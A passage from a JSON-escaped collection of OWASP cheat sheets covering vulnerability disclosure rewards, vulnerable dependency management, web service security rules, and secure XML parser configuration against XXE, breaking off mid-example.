(essentially providing free security testing), and have acted professionally and helpfully throughout the vulnerability disclosure process, it is good to offer them some kind of reward to encourage this kind of positive interaction in future. If monetary rewards are not possible then a number of other options should be considered, such as:\r\n\r\n- Discounts or credit for services or products offered by the organisation.\r\n- Virtual rewards (such as special in-game items, custom avatars, etc).\r\n- T-shirts, stickers and other branded items (swag).\r\n- Credit in a \"hall of fame\", or other similar acknowledgement.\r\n\r\n## Further Reading\r\n\r\n- [The CERT Guide to Coordinated Vulnerability Disclosure](https://vuls.cert.org/confluence/display/CVD/The+CERT+Guide+to+Coordinated+Vulnerability+Disclosure)\r\n- [HackerOne's Vulnerability Disclosure Guidelines](https://www.hackerone.com/disclosure-guidelines)\r\n- [Disclose.io's Vulnerability Disclosure Terms](https://github.com/disclose/disclose/tree/master/terms)\r\n"
    },
    {
      "Vulnerable_Dependency_Management_Cheat_Sheet.md": "# Vulnerable Dependency Management Cheat Sheet\r\n\r\n## Introduction\r\n\r\nThe objective of the cheat sheet is to provide a proposal of approach regarding the handling of vulnerable third-party dependencies when they are detected, and this, depending on different situation.\r\n\r\nThe cheat sheet is not tools oriented but it contains a [tools](#Tools) section informing the reader about free and commercial solutions that can be used to detect vulnerable dependencies, depending on the level of support on the technologies at hand\r\n\r\n**Note:**\r\n\r\nProposals mentioned in this cheat sheet are not silver-bullet (recipes that work in all situations) yet can be used as a foundation and adapted to your context.\r\n\r\n## Context\r\n\r\nMost of the projects use third-party dependencies to delegate handling of different kind of operations, _e.g._ generation of document in a specific format, HTTP communications, data parsing of a specific format, etc.\r\n\r\nIt's a good approach because it allows the development team to focus on the real application code supporting the expected business feature. The dependency brings forth an expected downside where the security posture of the real application is now resting on it.\r\n\r\nThis aspect is referenced in the following projects:\r\n\r\n- [OWASP TOP 10 2017](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/) under the point *[A9 - Using Components with Known Vulnerabilities](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A9-Using_Components_with_Known_Vulnerabilities.html)*.\r\n- [OWASP Application Security Verification Standard Project](https://owasp.org/www-project-application-security-verification-standard/) under the section *V14.2 Dependency*.\r\n\r\nBased on this context, it's important for a project to ensure that all the third-party dependencies implemented are clean of any security issue, and if they happen to contain any security issues, the development team needs to be aware of it and apply the required mitigation measures to secure the affected application.\r\n\r\nIt's highly recommended to perform automated analysis of the dependencies from the birth of the project. Indeed, if this task is added at the middle or end of the project, it can imply a huge amount of work to handle all the issues identified and that will in turn impose a huge burden on the development team and might to blocking the advancement of the project at hand.\r\n\r\n**Note:**\r\n\r\nIn the rest of the cheat sheet, when we refer to *development team* then we assume that the team contains a member with the required application security skills or can refer to someone in the company having these kind of skills to analyse the vulnerability impacting the dependency.\r\n\r\n## Remark about the detection\r\n\r\nIt's important to keep in mind the different ways in which a security issue is handled after its discovery.\r\n\r\n### 1. Responsible disclosure\r\n\r\nSee a description [here](https://en.wikipedia.org/wiki/Responsible_disclosure).\r\n\r\nA researcher discovers a vulnerability in a component, and after collaboration with the component provider, they issue a [CVE](https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures) (sometimes a specific vulnerability identifier to the provider is created but generally a CVE identifier is preferred) associated to the issue allowing the public referencing of the issue as well as the available fixation/mitigation.\r\n\r\nIf in case the provider doesn't properly cooperate with the researcher, the following results are expected:\r\n\r\n- CVE gets accepted by the vendor yet the provider [refuses to fix the issue](https://www.excellium-services.com/cert-xlm-advisory/cve-2019-7161/).\r\n- Most of the time, if the researcher doesn't receive back a response in 30 days, they go ahead and do a [full disclosure](#2.-full-disclosure) of the vulnerability.\r\n\r\nHere, the vulnerability is always referenced in the [CVE global database](https://nvd.nist.gov/vuln/data-feeds) used, generally, by the detection tools as one of the several input sources used.\r\n\r\n### 2. Full disclosure\r\n\r\nSee a description [here](https://en.wikipedia.org/wiki/Full_disclosure), into the section named **Computers** about **Computer Security**.\r\n\r\nThe researcher decides to release all the information including exploitation code/method on services like [Full Disclosure mailing list](https://seclists.org/fulldisclosure/), [Exploit-DB](https://www.exploit-db.com).\r\n\r\nHere a CVE is not always created then the vulnerability is not always in the CVE global database causing the detection tools to be potentially blind about unless the tools use other input sources.\r\n\r\n## Remark about the security issue handling decision\r\n\r\nWhen a security issue is detected, it's possible to decide to accept the risk represented by the security issue. However, this decision must be taken by the [Chief Risk Officer](https://en.wikipedia.org/wiki/Chief_risk_officer) (fallback possible to [Chief Information Security Officer](https://en.wikipedia.org/wiki/Chief_information_security_officer)) of the company based on technical feedback from the development team that have analyzed the issue (see the *[Cases](#cases)* section) as well as the CVEs [CVSS](https://www.first.org/cvss/user-guide) score indicators.\r\n\r\n## Cases\r\n\r\nWhen a security issue is detected, the development team can meet one of the situations (named *Case* in the rest of the cheat sheet) presented in the sub sections below.\r\n\r\nIf the vulnerably impact a [transitive dependency](https://en.wikipedia.org/wiki/Transitive_dependency) then the action will be taken on the direct dependency of the project because acting on a transitive dependency often impact the stability of the application.\r\n\r\nActing on a on a transitive dependency require the development team to fully understand the complete relation/communication/usage from the project first level dependency until the dependency impacted by the security vulnerability, this task is very time consuming.\r\n\r\n### Case 1\r\n\r\n#### Context\r\n\r\nPatched version of the component has been released by the provider.\r\n\r\n#### Ideal condition of application of the approach\r\n\r\nSet of automated unit or integration or functional or security tests exist for the features of the application using the impacted dependency allowing to validate that the feature is operational.\r\n\r\n#### Approach\r\n\r\n**Step 1:**\r\n\r\nUpdate the version of the dependency in the project on a testing environment.\r\n\r\n**Step 2:**\r\n\r\nPrior to running the tests, 2 output paths are possible:\r\n\r\n- All tests succeed, and thus the update can be pushed to production.\r\n- One or several tests failed, several output paths are possible:\r\n    - Failure is due to change in some function calls (_e.g._ signature, argument, package, etc.). The development team must update their code to fit the new library. Once that is done, re-run the tests.\r\n    - Technical incompatibility of the released dependency (_e.g._ require a more recent runtime version) which leads to the following actions:\r\n    1. Raise the issue to the provider.\r\n    2. Apply [Case 2](#case-2) while waiting for the provider's feedback.\r\n\r\n### Case 2\r\n\r\n#### Context\r\n\r\nProvider informs the team that it will take a while to fix the issue and, so, a patched version will not be available before months.\r\n\r\n#### Ideal condition of application of the approach\r\n\r\nProvider can share any of the below with the development team:\r\n\r\n- The exploitation code.\r\n- The list of impacted functions by the vulnerability.\r\n- A workaround to prevent the exploitation of the issue.\r\n\r\n#### Approach\r\n\r\n**Step 1:**\r\n\r\nIf a workaround is provided, it should be applied and validated on the testing environment, and thereafter deployed to production.\r\n\r\nIf the provider has given the team a list of the impacted functions, protective code must wrap the calls to these functions to ensure that the input and the output data is safe.\r\n\r\nMoreover, security devices, such as the Web Application Firewall (WAF), can handle such issues by protecting the internal applications through parameter validation and by generating detection rules for those specific libraries. Yet, in this cheat sheet, the focus is set on the application level in order to patch the vulnerability as close as possible to the source.\r\n\r\n*Example using java code in which the impacted function suffers from a [Remote Code Execution](https://www.netsparker.com/blog/web-security/remote-code-evaluation-execution/) issue:*\r\n\r\n```java\r\npublic void callFunctionWithRCEIssue(String externalInput){\r\n    //Apply input validation on the external input using regex\r\n    if(Pattern.matches(\"[a-zA-Z0-9]{1,50}\", externalInput)){\r\n        //Call the flawed function using safe input\r\n        functionWithRCEIssue(externalInput);\r\n    }else{\r\n        //Log the detection of exploitation\r\n        SecurityLogger.warn(\"Exploitation of the RCE issue XXXXX detected !\");\r\n        //Raise an exception leading to a generic error send to the client...\r\n    }\r\n}\r\n```\r\n\r\nIf the provider has provided nothing about the vulnerability, [Case 3](#-case-3) can be applied skipping the *step 2* of this case. We assume here that, at least, the [CVE](https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures) has been provided.\r\n\r\n**Step 2:**\r\n\r\nIf the provider has provided the team with the exploitation code, and the team made a security wrapper around the vulnerable library/code, execute the exploitation code in order to ensure that the library is now secure and doesn't affect the application.\r\n\r\nIf you have a set of automated unit or integration or functional or security tests that exist for the application, run them to verify that the protection code added does not impact the stability of the application.\r\n\r\nAdd a comment in the project *README* explaining that the issue (specify the related [CVE](https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures)) is handled during the waiting time of a patched version because the detection tool will continue to raise an alert on this dependency.\r\n\r\n**Note:** You can add the dependency to the ignore list but the ignore scope for this dependency must only cover the [CVE](https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures) related to the vulnerability because a dependency can be impacted by several vulnerabilities having each one its own [CVE](https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures).\r\n\r\n### Case 3\r\n\r\n#### Context\r\n\r\nProvider informs the team that they cannot fix the issue, so no patched version will be released at all (applies also if provider does not want to fix the issue or does not answer at all).\r\n\r\nIn this case the only information given to the development team is the [CVE](https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures).\r\n\r\n**Notes:**\r\n\r\n- This case is really complex and time consuming and is generally used as last resort.\r\n- If the impacted dependency is an open source library then we, the development team, can create a patch and create [pull request](https://help.github.com/en/articles/about-pull-requests) - that way we can protect our company/application from the source as well as helping others secure their applications.\r\n\r\n#### Ideal condition of application of the approach\r\n\r\nNothing specific because here we are in a *patch yourself* condition.\r\n\r\n#### Approach\r\n\r\n**Step 1:**\r\n\r\nIf we are in this case due to one of the following conditions, it's a good idea to start a parallel study to find another component better maintained or if it's a commercial component with support **then put pressure** on the provider with the help of your [Chief Risk Officer](https://en.wikipedia.org/wiki/Chief_risk_officer) (fallback possible to [Chief Information Security Officer](https://en.wikipedia.org/wiki/Chief_information_security_officer)):\r\n\r\n- Provider does not want to fix the issue.\r\n- Provider does not answer at all.\r\n\r\nIn all cases, here, we need to handle the vulnerability right now.\r\n\r\n**Step 2:**\r\n\r\nAs we know the vulnerable dependency, we know where it is used in the application (if it's a transitive dependency then we can identify the first level dependency using it using the [IDE](https://en.wikipedia.org/wiki/Integrated_development_environment) built-in feature or the dependency management system used (Maven, Gradle, NuGet, npm, etc.). Note that IDE is also used to identify the calls to the dependency.\r\n\r\nIdentifying calls to this dependency is fine but it is the first step. The team still lacks information on what kind of patching needs to be performed.\r\n\r\nTo obtain these information, the team uses the CVE content to know which kind of vulnerability affects the dependency. The `description` property provides the answer: SQL injection, Remote Code Execution, Cross-Site Scripting, Cross-Site Request Forgery, etc.\r\n\r\nAfter identifying the above 2 points, the team is aware of the type of patching that needs to be taken ([Case 2](#case-2) with the protective code) and where to add it.\r\n\r\n*Example:*\r\n\r\nThe team has an application using the Jackson API in a version exposed to the [CVE-2016-3720](https://nvd.nist.gov/vuln/detail/CVE-2016-3720).\r\n\r\nThe description of the CVE is as follows:\r\n\r\n```text\r\nXML external entity (XXE) vulnerability in XmlMapper in the Data format extension for Jackson\r\n(aka jackson-dataformat-xml) allows attackers to have unspecified impact via unknown vectors.\r\n```\r\n\r\nBased on these information, the team determines that the necessary patching will be to add a [pre-validation of any XML data](XML_External_Entity_Prevention_Cheat_Sheet.md) passed to the Jakson API to prevent [XML external entity (XXE)](https://www.acunetix.com/blog/articles/xml-external-entity-xxe-vulnerabilities/) vulnerability.\r\n\r\n**Step 3:**\r\n\r\nIf possible, create a unit test that mimics the vulnerability in order to ensure that the patch is effective and have a way to continuously ensure that the patch is in place during the evolution of the project.\r\n\r\nIf you have a set of automated unit or integration or functional or security tests that exists for the application then run them to verify that the patch does not impact the stability of the application.\r\n\r\n### Case 4\r\n\r\n#### Context\r\n\r\nThe vulnerable dependency is found during one of the following situation in which the provider is not aware of the vulnerability:\r\n\r\n- Via the discovery of a full disclosure post on the Internet.\r\n- During a penetration test.\r\n\r\n#### Ideal condition of application of the approach\r\n\r\nProvider collaborates with you after being notified of the vulnerability.\r\n\r\n#### Approach\r\n\r\n**Step 1:**\r\n\r\nInform the provider about the vulnerability by sharing the post with them.\r\n\r\n**Step 2:**\r\n\r\nUsing the information from the full disclosure post or the pentester's exploitation feedback, if the provider collaborates then apply [Case 2](#case-2), otherwise apply [Case 3](#case-3), and instead of analyzing the CVE information, the team needs to analyze the information from the full disclosure post/pentester's exploitation feedback.\r\n\r\n## Tools\r\n\r\nThis section lists several tools that can used to analyse the dependencies used by a project in order to detect the vulnerabilities.\r\n\r\nIt's important to ensure, during the selection process of a vulnerable dependency detection tool, that this one:\r\n\r\n- Uses several reliable input sources in order to handle both vulnerability disclosure ways.\r\n- Support for flagging an issue raised on a component as a [false-positive](https://www.whitehatsec.com/glossary/content/false-positive).\r\n\r\n- Free\r\n    - [OWASP Dependency Check](https://owasp.org/www-project-dependency-check/):\r\n        - Full support: Java, .Net.\r\n        - Experimental support: Python, Ruby, PHP (composer), NodeJS, C, C++.\r\n    - [NPM Audit](https://docs.npmjs.com/cli/audit)\r\n        - Full support: NodeJS, JavaScript.\r\n        - HTML report available via this [module](https://www.npmjs.com/package/npm-audit-html).\r\n    - [OWASP Dependency Track](https://dependencytrack.org/) can be used to manage vulnerable dependencies across an organization.\r\n    - [ThreatMapper](https://github.com/deepfence/ThreatMapper)\r\n        - Full support: Base OS, Java, NodeJS, JavaScript, Ruby, Python\r\n        - Targets: Kubernetes (nodes and container), Docker (node and containers), Fargate (containers), Bare Metal/VM (Host and app)\r\n- Commercial\r\n    - [Snyk](https://snyk.io/) (open source and free option available):\r\n        - [Full support](https://snyk.io/docs/) for many languages and package manager.\r\n    - [JFrog XRay](https://jfrog.com/xray/):\r\n        - [Full support](https://jfrog.com/integration/) for many languages and package manager.\r\n    - [Renovate](https://renovatebot.com) (allow to detect old dependencies):\r\n        - [Full support](https://renovatebot.com/docs/) for many languages and package manager.\r\n    - [Requires.io](https://requires.io/) (allow to detect old dependencies - open source and free option available):\r\n        - [Full support](https://requires.io/features/): Python only.\r\n"
    },
    {
      "Web_Service_Security_Cheat_Sheet.md": "# Web Service Security Cheat Sheet\r\n\r\n## Introduction\r\n\r\nThis article is focused on providing guidance for securing web services and preventing web services related attacks.\r\n\r\nPlease notice that due to the difference in implementation between different frameworks, this cheat sheet is kept at a high level.\r\n\r\n## Transport Confidentiality\r\n\r\nTransport confidentiality protects against eavesdropping and man-in-the-middle attacks against web service communications to/from the server.\r\n\r\n**Rule**: All communication with and between web services containing sensitive features, an authenticated session, or transfer of sensitive data must be encrypted using well-configured [TLS](https://en.wikipedia.org/wiki/Transport_Layer_Security). This is recommended even if the messages themselves are encrypted because [TLS](https://en.wikipedia.org/wiki/Transport_Layer_Security) provides numerous benefits beyond traffic confidentiality including integrity protection, replay defenses, and server authentication. For more information on how to do this properly see the [Transport Layer Protection Cheat Sheet](Transport_Layer_Protection_Cheat_Sheet.md).\r\n\r\n## Server Authentication\r\n\r\n**Rule**: TLS must be used to authenticate the service provider to the service consumer. The service consumer should verify the server certificate is issued by a trusted provider, is not expired, is not revoked, matches the domain name of the service, and that the server has proven that it has the private key associated with the public key certificate (by properly signing something or successfully decrypting something encrypted with the associated public key).\r\n\r\n## User Authentication\r\n\r\nUser authentication verifies the identity of the user or the system trying to connect to the service. Such authentication is usually a function of the container of the web service.\r\n\r\n**Rule**: If used, Basic Authentication must be conducted over [TLS](https://en.wikipedia.org/wiki/Transport_Layer_Security), but Basic Authentication is not recommended because it discloses secrets in plan text (base64 encoded) in HTTP Headers.\r\n\r\n**Rule**: Client Certificate Authentication using [Mutual-TLS](https://en.wikipedia.org/wiki/Transport_Layer_Security) is a common form of authentication that is recommended where appropriate. See: [Authentication Cheat Sheet](Authentication_Cheat_Sheet.md).\r\n\r\n## Transport Encoding\r\n\r\n[SOAP](https://en.wikipedia.org/wiki/SOAP) encoding styles are meant to move data between software objects into XML format and back again.\r\n\r\n**Rule**: Enforce the same encoding style between the client and the server.\r\n\r\n## Message Integrity\r\n\r\nThis is for data at rest. The integrity of data in transit can easily be provided by [TLS](https://en.wikipedia.org/wiki/Transport_Layer_Security).\r\n\r\nWhen using [public key cryptography](https://en.wikipedia.org/wiki/Public-key_cryptography), encryption does guarantee confidentiality but it does not guarantee integrity since the receiver's public key is public. For the same reason, encryption does not ensure the identity of the sender.\r\n\r\n**Rule**: For XML data, use XML digital signatures to provide message integrity using the sender's private key. This signature can be validated by the recipient using the sender's digital certificate (public key).\r\n\r\n## Message Confidentiality\r\n\r\nData elements meant to be kept confidential must be encrypted using a strong encryption cipher with an adequate key length to deter brute-forcing.\r\n\r\n**Rule**: Messages containing sensitive data must be encrypted using a strong encryption cipher. This could be transport encryption or message encryption.\r\n\r\n**Rule**: Messages containing sensitive data that must remain encrypted at rest after receipt must be encrypted with strong data encryption, not just transport encryption.\r\n\r\n## Authorization\r\n\r\nWeb services need to authorize web service clients the same way web applications authorize users. A web service needs to make sure a web service client is authorized to perform a certain action (coarse-grained) on the requested data (fine-grained).\r\n\r\n**Rule**: A web service should authorize its clients whether they have access to the method in question. Following an authentication challenge, the web service should check the privileges of the requesting entity whether they have access to the requested resource. This should be done on every request, and a challenge-response Authorization mechanism added to sensitive resources like password changes, primary contact details such as email, physical address, payment or delivery instructions.\r\n\r\n**Rule**: Ensure access to administration and management functions within the Web Service Application is limited to web service administrators. Ideally, any administrative capabilities would be in an application that is completely separate from the web services being managed by these capabilities, thus completely separating normal users from these sensitive functions.\r\n\r\n## Schema Validation\r\n\r\nSchema validation enforces constraints and syntax defined by the schema.\r\n\r\n**Rule**: Web services must validate [SOAP](https://en.wikipedia.org/wiki/SOAP) payloads against their associated XML schema definition ([XSD](https://www.w3schools.com/xml/schema_intro.asp)).\r\n\r\n**Rule**: The [XSD](https://www.w3schools.com/xml/schema_intro.asp) defined for a [SOAP](https://en.wikipedia.org/wiki/SOAP) web service should, at a minimum, define the maximum length and character set of every parameter allowed to pass into and out of the web service.\r\n\r\n**Rule**: The [XSD](https://www.w3schools.com/xml/schema_intro.asp) defined for a [SOAP](https://en.wikipedia.org/wiki/SOAP) web service should define strong (ideally allow-list) validation patterns for all fixed format parameters (e.g., zip codes, phone numbers, list values, etc.).\r\n\r\n## Content Validation\r\n\r\n**Rule**: Like any web application, web services need to validate input before consuming it. Content validation for XML input should include:\r\n\r\n- Validation against malformed XML entities.\r\n- Validation against [XML Bomb attacks](https://en.wikipedia.org/wiki/Billion_laughs_attack).\r\n- Validating inputs using a strong allow list.\r\n- Validating against [external entity attacks](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_%28XXE%29_Processing).\r\n\r\n## Output Encoding\r\n\r\nWeb services need to ensure that the output sent to clients is encoded to be consumed as data and not as scripts. This gets pretty important when web service clients use the output to render HTML pages either directly or indirectly using AJAX objects.\r\n\r\n**Rule**: All the rules of output encoding applies as per [Cross Site Scripting Prevention Cheat Sheet](Cross_Site_Scripting_Prevention_Cheat_Sheet.md).\r\n\r\n## Virus Protection\r\n\r\n[SOAP](https://en.wikipedia.org/wiki/SOAP) provides the ability to attach files and documents to [SOAP](https://en.wikipedia.org/wiki/SOAP) messages. This gives the opportunity for hackers to attach viruses and malware to these [SOAP](https://en.wikipedia.org/wiki/SOAP) messages.\r\n\r\n**Rule**: Ensure Virus Scanning technology is installed and preferably inline so files and attachments could be checked before being saved on disk.\r\n\r\n**Rule**: Ensure Virus Scanning technology is regularly updated with the latest virus definitions/rules.\r\n\r\n## Message Size\r\n\r\nWeb services like web applications could be a target for DOS attacks by automatically sending the web services thousands of large size [SOAP](https://en.wikipedia.org/wiki/SOAP) messages. This either cripples the application making it unable to respond to legitimate messages or it could take it down entirely.\r\n\r\n**Rule**: [SOAP](https://en.wikipedia.org/wiki/SOAP) Messages size should be limited to an appropriate size limit. Larger size limit (or no limit at all) increases the chances of a successful DoS attack.\r\n\r\n## Availability\r\n\r\n### Resources Limiting\r\n\r\nDuring regular operation, web services require computational power such as CPU cycles and memory. Due to malfunctioning or while under attack, a web service may required too much resources, leaving the host system unstable.\r\n\r\n**Rule**: Limit the amount of CPU cycles the web service can use based on expected service rate, in order to have a stable system.\r\n\r\n**Rule**: Limit the amount of memory the web service can use to avoid system running out of memory. In some cases the host system may start killing processes to free up memory.\r\n\r\n**Rule**: Limit the number of simultaneous open files, network connections and started processes.\r\n\r\n### Message Throughput\r\n\r\nThroughput represents the number of web service requests served during a specific amount of time.\r\n\r\n**Rule**: Configuration should be optimized for maximum message throughput to avoid running into DoS-like situations.\r\n\r\n### XML Denial of Service Protection\r\n\r\nXML Denial of Service is probably the most serious attack against web services. So the web service must provide the following validation:\r\n\r\n**Rule**: Validation against recursive payloads.\r\n\r\n**Rule**: Validation against oversized payloads.\r\n\r\n**Rule**: Protection against [XML entity expansion](https://www.ws-attacks.org/XML_Entity_Expansion).\r\n\r\n**Rule**: Validating against overlong element names. If you are working with [SOAP](https://en.wikipedia.org/wiki/SOAP)-based Web Services, the element names are those [SOAP](https://en.wikipedia.org/wiki/SOAP) Actions.\r\n\r\nThis protection should be provided by your XML parser/schema validator. To verify, build test cases to make sure your parser to resistant to these types of attacks.\r\n\r\n## Endpoint Security Profile\r\n\r\n**Rule**: Web services must be compliant with [Web Services-Interoperability (WS-I)](https://en.wikipedia.org/wiki/Web_Services_Interoperability) Basic Profile at minimum.\r\n"
    },
    {
      "XML_External_Entity_Prevention_Cheat_Sheet.md": "# XML External Entity Prevention Cheat Sheet\r\n\r\n## Introduction\r\n\r\n*XML eXternal Entity injection* (XXE), which is now part of the [OWASP Top 10](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A4-XML_External_Entities_%28XXE%29) via the point **A4**, is a type of attack against an application that parses XML input.\r\n\r\nXXE issue is referenced under the ID [611](https://cwe.mitre.org/data/definitions/611.html) in the [Common Weakness Enumeration](https://cwe.mitre.org/index.html) referential.\r\n\r\nThis attack occurs when untrusted XML input containing a **reference to an external entity is processed by a weakly configured XML parser**.\r\n\r\nThis attack may lead to the disclosure of confidential data, denial of service, [Server Side Request Forgery](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery) (SSRF), port scanning from the perspective of the machine where the parser is located, and other system impacts. The following guide provides concise information to prevent this vulnerability.\r\n\r\nFor more information on XXE, please visit [XML External Entity (XXE)](https://en.wikipedia.org/wiki/XML_external_entity_attack).\r\n\r\n## General Guidance\r\n\r\nThe safest way to prevent XXE is always to disable DTDs (External Entities) completely. Depending on the parser, the method should be similar to the following:\r\n\r\n``` java\r\nfactory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\r\n```\r\n\r\nDisabling [DTD](https://www.w3schools.com/xml/xml_dtd.asp)s also makes the parser secure against denial of services (DOS) attacks such as [Billion Laughs](https://en.wikipedia.org/wiki/Billion_laughs_attack). If it is not possible to disable DTDs completely, then external entities and external document type declarations must be disabled in the way that's specific to each parser.\r\n\r\nDetailed XXE Prevention guidance for a number of languages and commonly used XML parsers in those languages is provided below.\r\n\r\n## C/C++\r\n\r\n### libxml2\r\n\r\nThe Enum [xmlParserOption](http://xmlsoft.org/html/libxml-parser.html#xmlParserOption) should not have the following options defined:\r\n\r\n- `XML_PARSE_NOENT`: Expands entities and substitutes them with replacement text\r\n- `XML_PARSE_DTDLOAD`: Load the external DTD\r\n\r\nNote:\r\n\r\nPer: According to [this post](https://mail.gnome.org/archives/xml/2012-October/msg00045.html), starting with libxml2 version 2.9, XXE has been disabled by default as committed by the following [patch](https://gitlab.gnome.org/GNOME/libxml2/commit/4629ee02ac649c27f9c0cf98ba017c6b5526070f).\r\n\r\nSearch for the usage of the following APIs to ensure there is no `XML_PARSE_NOENT` and `XML_PARSE_DTDLOAD` defined in the parameters:\r\n\r\n- `xmlCtxtReadDoc`\r\n- `xmlCtxtReadFd`\r\n- `xmlCtxtReadFile`\r\n- `xmlCtxtReadIO`\r\n- `xmlCtxtReadMemory`\r\n- `xmlCtxtUseOptions`\r\n- `xmlParseInNodeContext`\r\n- `xmlReadDoc`\r\n- `xmlReadFd`\r\n- `xmlReadFile`\r\n- `xmlReadIO`\r\n- `xmlReadMemory`\r\n\r\n### libxerces-c\r\n\r\nUse of `XercesDOMParser` do this to prevent XXE:\r\n\r\n``` cpp\r\nXercesDOMParser *parser = new XercesDOMParser;\r\nparser->setCreateEntityReferenceNodes(true);\r\nparser->setDisableDefaultEntityResolution(true);\r\n```\r\n\r\nUse of SAXParser, do this to prevent XXE:\r\n\r\n``` cpp\r\nSAXParser* parser = new SAXParser;\r\nparser->setDisableDefaultEntityResolution(true);\r\n```\r\n\r\nUse of SAX2XMLReader, do this to prevent XXE:\r\n\r\n``` cpp\r\nSAX2XMLReader* reader = XMLReaderFactory::createXMLReader();\r\nparser->setFeature(XMLUni::fgXercesDisableDefaultEntityResolution, true);\r\n```\r\n\r\n## ColdFusion\r\n\r\nPer [this blog post](https://hoyahaxa.blogspot.com/2022/11/on-coldfusion-xxe-and-other-xml-attacks.html), both Adobe ColdFusion and Lucee have built-in mechanisms to disable support for external XML entities.\r\n\r\n### Adobe ColdFusion\r\n\r\nAs of ColdFusion 2018 Update 14 and ColdFusion 2021 Update 4, all native ColdFusion functions that process XML now support an XML parser argument to disable support for external XML entities.  Note that there is no global setting to disable external entities, so a developer must ensure that every XML function call contains the required security options.\r\n\r\nFrom the [documentation for the XmlParse() function](https://helpx.adobe.com/coldfusion/cfml-reference/coldfusion-functions/functions-t-z/xmlparse.html), you can disable XXE with the code below:\r\n\r\n```\r\n<cfset parseroptions = structnew()>\r\n<cfset parseroptions.ALLOWEXTERNALENTITIES = false>\r\n<cfscript>\r\na = XmlParse(\"xml.xml\", false, parseroptions);\r\nwriteDump(a);\r\n</cfscript>\r\n```\r\n\r\nYou can use the \"parseroptions\" structure shown above as an argument to secure other functions that process XML as well, such as:\r\n\r\n```\r\nXxmlSearch(xmldoc, xpath,parseroptions);\r\n\r\nXmlTransform(xmldoc,xslt,parseroptions);\r\n\r\nisXML(xmldoc,parseroptions);\r\n```\r\n\r\n### Lucee\r\n\r\nAs of Lucee 5.3.4.51 and later, you can disable support for XML external entities by adding the following to your Application.cfc:\r\n\r\n```\r\nthis.xmlFeatures = {\r\n     externalGeneralEntities: false,\r\n     secure: true,\r\n     disallowDoctypeDecl: true\r\n};\r\n```\r\n\r\nSupport for external XML entities is disabled by default as of Lucee 5.4.2.10 and Lucee 6.0.0.514.\r\n\r\n## Java\r\n\r\nJava applications using XML libraries are particularly vulnerable to XXE because the default settings for most Java XML parsers is to have XXE enabled. To use these parsers safely, you have to explicitly disable XXE in the parser you use. The following describes how to disable XXE in the most commonly used XML parsers for Java.\r\n\r\n### JAXP DocumentBuilderFactory, SAXParserFactory and DOM4J\r\n\r\n`DocumentBuilderFactory,` `SAXParserFactory` and `DOM4J` `XML` Parsers can be configured using the same techniques to protect them against XXE.\r\n\r\nOnly the `DocumentBuilderFactory` example is presented here. The JAXP `DocumentBuilderFactory` [setFeature](https://docs.oracle.com/javase/7/docs/api/javax/xml/parsers/DocumentBuilderFactory.html#setFeature(java.lang.String,%20boolean)) method allows a developer to control which implementation-specific XML processor features are enabled or disabled.\r\n\r\nThe features can either be set on the factory or the underlying `XMLReader` [setFeature](https://docs.oracle.com/javase/7/docs/api/org/xml/sax/XMLReader.html#setFeature%28java.lang.String,%20boolean%29) method.\r\n\r\nEach XML processor implementation has its own features that govern how DTDs and external entities are processed. By disabling DTD processing entirely, most XXE attacks can be averted, although it is also necessary to disable or verify that XInclude is not enabled.\r\n\r\nSince the JDK 6, the flag [FEATURE_SECURE_PROCESSING](https://docs.oracle.com/javase/6/docs/api/javax/xml/XMLConstants.html#FEATURE_SECURE_PROCESSING) can be used **to instruct the implementation of the parser to process XML securely**. Its behaviour is implementation dependent. Even if it can help tackling resource exhaustion, it may not always mitigate entity expansion. More details on this flag can be found [here](https://docs.oracle.com/en/java/javase/13/security/java-api-xml-processing-jaxp-security-guide.html#GUID-88B04BE2-35EF-4F61-B4FA-57A0E9102342).\r\n\r\nFor a syntax highlighted example code snippet using `SAXParserFactory`, look [here](https://gist.github.com/asudhakar02/45e2e6fd8bcdfb4bc3b2).\r\nExample code disabling DTDs (doctypes) altogether:\r\n\r\n``` java\r\nimport javax.xml.parsers.DocumentBuilderFactory;\r\nimport javax.xml.parsers.ParserConfigurationException; // catching unsupported features\r\nimport javax.xml.XMLConstants;\r\n\r\n...\r\n\r\nDocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\r\nString FEATURE = null;\r\ntry {\r\n    // This is the PRIMARY defense. If DTDs (doctypes) are disallowed, almost all\r\n    // XML entity attacks are prevented\r\n    // Xerces 2 only - http://xerces.apache.org/xerces2-j/features.html#disallow-doctype-decl\r\n    FEATURE = \"http://apache.org/xml/features/disallow-doctype-decl\";\r\n    dbf.setFeature(FEATURE, true);\r\n\r\n    // and these as well, per Timothy Morgan's 2014 paper: \"XML Schema, DTD, and Entity Attacks\"\r\n    dbf.setXIncludeAware(false);\r\n\r\n    // remaining parser logic\r\n    ...\r\n} catch (ParserConfigurationException e) {\r\n    // This should catch a failed setFeature feature\r\n    // NOTE: Each call to setFeature() should be in its own try/catch otherwise subsequent calls will be skipped.\r\n    // This is only important if you're ignoring errors for multi-provider support.\r\n    logger.info(\"ParserConfigurationException was thrown. The feature '\" + FEATURE\r\n    + \"' is not supported by your XML processor.\");\r\n    ...\r\n} catch (SAXException e) {\r\n    // On Apache, this should be thrown when disallowing DOCTYPE\r\n    logger.warning(\"A DOCTYPE was passed into the XML document\");\r\n    ...\r\n} catch (IOException e) {\r\n    // XXE that points to a file that doesn't exist\r\n    logger.error(\"IOException occurred, XXE may still possible: \" + e.getMessage());\r\n    ...\r\n}\r\n\r\n// Load XML file or stream using a XXE agnostic configured parser...\r\nDocumentBuilder safebuilder = dbf.newDocumentBuilder();\r\n```\r\n\r\nIf you can't completely disable DTDs:\r\n\r\n``` java\r\nimport javax.xml.parsers.DocumentBuilderFactory;\r\nimport javax.xml.parsers.ParserConfigurationException; // catching unsupported features\r\nimport javax.xml.XMLConstants;\r\n\r\n...\r\n\r\nDocumentBuilderFactory dbf = 